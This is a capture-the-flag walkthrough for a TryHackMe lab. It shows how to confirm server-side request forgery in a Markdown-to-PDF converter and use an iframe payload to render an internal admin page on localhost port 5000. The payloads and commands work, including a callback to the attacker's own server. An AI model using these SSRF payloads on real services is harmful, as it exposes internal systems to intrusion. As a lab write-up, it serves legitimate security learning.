# MD2PDF

{% embed url="https://tryhackme.com/room/md2pdf" %}

Web exploitation room centred around SSRF. The app converts Markdown to PDF using a headless renderer — and if you slip an iframe into the Markdown, the renderer fetches internal URLs for you.

---

## Enumeration

```bash
nmap -sV -T4 MACHINE_IP
```

Port 80 is open — web app called MD2PDF that takes Markdown input and spits out a PDF.

---

## Confirming SSRF

Test whether the renderer fetches external URLs by injecting an image tag pointing at your machine:

```bash
python3 -m http.server 8080   # on your attack box
```

Payload in the Markdown field:

```markdown
![test](http://YOUR_IP:8080/test)
```

Submit. You'll see a hit in your HTTP server — the backend renderer is fetching outbound. **SSRF confirmed.**

---

## Finding the Internal Service

The renderer runs on the server so it can reach `localhost`. Try common internal ports. Port `5000` is running something:

```markdown
<iframe src="http://127.0.0.1:5000/admin" width="800" height="600"></iframe>
```

Submit → download the PDF → open it. The internal admin page is rendered inside the PDF.

---

## Extracting the Flag

The `/admin` page returns the flag. Extract it from the PDF:

```bash
pdftotext output.pdf -
```

Or just read it in your PDF viewer — the flag is visible in the rendered content.

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the flag? | Found inside the PDF rendered from `http://127.0.0.1:5000/admin` — format `flag{hidden}` |

> The flag is dynamically generated per instance on TryHackMe. Use the SSRF payload `<iframe src="http://127.0.0.1:5000/admin">` to retrieve it from your own machine instance.
